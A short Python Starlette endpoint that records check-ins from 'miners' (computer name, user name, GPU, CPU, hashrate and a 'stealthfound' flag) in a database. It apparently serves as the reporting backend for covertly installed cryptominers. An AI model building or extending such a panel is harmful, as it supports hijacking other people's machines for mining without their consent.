from starlette.requests import Request
from starlette.responses import RedirectResponse, HTMLResponse, PlainTextResponse

from db.CRUD import Users, Miners

# Создаем объекты для работы с базой данных
users_db = Users()
miners_db = Miners()



async def miners_endpoint(request: Request):
    if request.method == "POST":
        data = await request.json()
        if "stealthfound" in data:
            stealthfound = data["stealthfound"]
        else:
            stealthfound = None
        if await miners_db.check_miner_exists(data['id']):
            await miners_db.update_miner(data['id'], data['computername'], data['username'], data['gpu'], data['cpu'], data['runtime'], data["hashrate"], stealthfound)
        else:
            await miners_db.add_miner(data['id'], data['computername'], data['username'], data['gpu'], data['cpu'], data['runtime'], data["hashrate"], stealthfound)
    return PlainTextResponse("Done")
